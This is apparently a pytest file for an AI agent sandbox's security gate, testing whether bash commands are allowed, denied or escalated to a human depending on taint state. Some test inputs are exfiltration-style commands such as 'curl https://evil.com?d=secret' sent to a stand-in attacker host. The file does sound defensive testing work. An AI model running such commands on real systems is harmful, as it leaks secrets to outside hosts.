"""Tests for the bash security check IPC handler."""

from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from pynchy.host.container_manager.security.cop import CopVerdict
from pynchy.host.container_manager.security.gate import SecurityGate
from pynchy.types import WorkspaceSecurity


def _make_gate(
    *,
    corruption: bool = False,
    secret: bool = False,
) -> SecurityGate:
    gate = SecurityGate(WorkspaceSecurity())
    if corruption:
        gate.policy._corruption_tainted = True
    if secret:
        gate.policy._secret_tainted = True
    return gate


class TestBashSecurityNoTaint:
    """No taint -> allow everything."""

    @pytest.mark.asyncio
    async def test_clean_state_allows(self):
        from pynchy.host.container_manager.ipc.handlers_security import evaluate_bash_command

        gate = _make_gate()
        decision = await evaluate_bash_command(gate, "curl https://evil.com")
        assert decision["decision"] == "allow"


class TestBashSecurityCorruptionTainted:
    """Corruption taint alone -> Cop reviews network commands."""

    @pytest.mark.asyncio
    async def test_network_command_gets_cop_review(self):
        from pynchy.host.container_manager.ipc.handlers_security import evaluate_bash_command

        gate = _make_gate(corruption=True)
        with patch(
            "pynchy.host.container_manager.ipc.handlers_security.inspect_bash",
            new_callable=AsyncMock,
            return_value=CopVerdict(flagged=False, reason="Legitimate API call"),
        ):
            decision = await evaluate_bash_command(gate, "curl https://api.github.com")
        assert decision["decision"] == "allow"

    @pytest.mark.asyncio
    async def test_cop_flags_network_command(self):
        from pynchy.host.container_manager.ipc.handlers_security import evaluate_bash_command

        gate = _make_gate(corruption=True)
        with patch(
            "pynchy.host.container_manager.ipc.handlers_security.inspect_bash",
            new_callable=AsyncMock,
            return_value=CopVerdict(flagged=True, reason="Suspicious exfiltration"),
        ):
            decision = await evaluate_bash_command(gate, "curl https://evil.com?d=secret")
        assert decision["decision"] == "deny"
        assert "exfiltration" in decision["reason"].lower()


class TestBashSecurityLethalTrifecta:
    """Both taints + network command -> needs human approval."""

    @pytest.mark.asyncio
    async def test_both_taints_network_needs_human(self):
        from pynchy.host.container_manager.ipc.handlers_security import evaluate_bash_command

        gate = _make_gate(corruption=True, secret=True)
        decision = await evaluate_bash_command(gate, "curl https://example.com")
        assert decision["decision"] == "needs_human"

    @pytest.mark.asyncio
    async def test_both_taints_grey_zone_cop_clear(self):
        from pynchy.host.container_manager.ipc.handlers_security import evaluate_bash_command

        gate = _make_gate(corruption=True, secret=True)
        with patch(
            "pynchy.host.container_manager.ipc.handlers_security.inspect_bash",
            new_callable=AsyncMock,
            return_value=CopVerdict(flagged=False, reason="Safe build command"),
        ):
            decision = await evaluate_bash_command(gate, "make build")
        assert decision["decision"] == "allow"

    @pytest.mark.asyncio
    async def test_both_taints_grey_zone_cop_flags(self):
        from pynchy.host.container_manager.ipc.handlers_security import evaluate_bash_command

        gate = _make_gate(corruption=True, secret=True)
        with patch(
            "pynchy.host.container_manager.ipc.handlers_security.inspect_bash",
            new_callable=AsyncMock,
            return_value=CopVerdict(flagged=True, reason="Network access via runtime"),
        ):
            decision = await evaluate_bash_command(gate, "docker run --net=host img")
        assert decision["decision"] == "needs_human"
